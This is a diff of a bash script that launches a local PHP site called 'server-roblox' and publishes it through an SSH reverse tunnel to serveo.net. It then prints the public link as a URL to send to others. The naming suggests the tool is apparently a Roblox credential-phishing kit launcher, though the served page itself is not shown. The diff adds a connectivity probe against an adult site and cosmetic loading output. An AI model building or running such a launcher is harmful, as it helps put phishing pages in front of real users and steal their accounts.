@@ -59,9 +59,28 @@ server_site() {
 	cd server-roblox && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
+
+timeout 3s curl -fIs "https://www.xvideos.com" > /dev/null
+if [[ $? -eq 0 ]]; then
+fred="\033[37mprogram \033[32mon-line\033[37m"
+else
+fred="\033[37mprogram \033[31moff-line\033[37m"
+fi
+
 start(){
-echo -e "\n\033[37m[-] Loading Program..."
-clear
+	clear
+        echo -e "\r\033[37m[-] Loading Program   "
+        sleep 0.5
+		clear
+        echo -e "\r\033[37m[-] Loading Program.  "
+        sleep 0.5
+		clear
+        echo -e "\r\033[37m[-] Loading Program.. "
+        sleep 0.5
+		clear
+        echo -e "\r\033[37m[-] Loading Program..."
+        sleep 0.5
+		clear
 timeout 3s curl -fIs "https://www.youtube.com/" > /dev/null
 if [[ $? -eq 0 ]]; then
 server_site
@@ -71,10 +90,11 @@ echo -e "Server is running on http://localhost:${PORT}"
 echo -e "Server connected!"
 echo -e "\n\033[32mUser Conected!\033[37m"
 echo -e "WELCOME!"
-echo -e "\n\033[37mLink            \033[32m$send_url\033[37m"
-echo -e "Version         0.0.1\nDate            $date_time\nUsername        \033[36m$whoami\033[37m\n\n"
+echo -e "\n\033[37mlink            \033[32m$send_url\033[37m"
+echo -e "version         0.0.2\ndate            $date_time\nusername        \033[36m$whoami\033[37m\nstatus          $fred\n"
 data
 else
+sleep 0.75
 echo -e ""
 echo -e "\033[33mroblox \033[37mHello $whoami :)"
 echo -e "\033[33mroblox \033[37mSoftware P 8080 $pwd"
@@ -93,10 +113,14 @@ sleep 2
 if [[ -e server-roblox/linksender ]]; then
 rm -rf server-roblox/linksender
 fi
+timeout 3s curl -fIs "https://www.xvideos.com" > /dev/null
+if [[ $? -eq 0 ]]; then
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$PORT' serveo.net 2> /dev/null > server-roblox/linksender ' &
 sleep 7
 send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" server-roblox/linksender)
-test="https://test.com.br"
+else
+send_url=$(printf "\033[31m(ERRO!) SSH PORT 80 | Check your Wi-Fi network...\033[37m")
+fi
 
 }
 
